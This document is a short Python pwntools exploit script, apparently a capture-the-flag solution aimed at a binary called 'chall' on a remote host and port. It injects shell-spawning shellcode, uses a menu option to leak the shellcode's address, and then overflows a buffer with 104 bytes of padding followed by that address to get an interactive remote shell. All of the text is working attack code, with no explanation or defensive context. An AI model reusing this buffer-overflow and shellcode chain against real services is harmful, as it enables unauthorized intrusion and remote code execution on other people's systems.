from pwn import *

elf = context.binary = ELF("./chall")
# p = process()
p = remote("13.212.234.124", 11101)
script = '''
	0x00000000000016e0
'''
# gdb.attach(p, gdbscript = script)

payload = b"1"
p.sendline(payload)

# payload = b"/bin/sh\x00"
payload = asm(shellcraft.sh())
p.sendline(payload)

padding = 104

p.sendlineafter(b"Enter your choice: ", b"3")
p.sendlineafter(b"Enter your choice: ", b"3")

print(p.recvuntil(b"Attendance Status:\n"))
# print(p.recv())
address = p.recvuntil(b"jhH").split()
bin_sh_addr = address[0].replace(b"No.", b"")

regular_string = bin_sh_addr.decode('utf-8')
if regular_string.startswith('0x'):
    regular_string = regular_string[2:] # Remove the '0x' prefix
integer_value = int(regular_string, 16)
print(integer_value)
print(bin_sh_addr)

p.sendlineafter(b"Enter your choice: ", b"2")
payload = b"A" * padding
payload += p64(integer_value)
p.sendline(payload)

p.interactive()
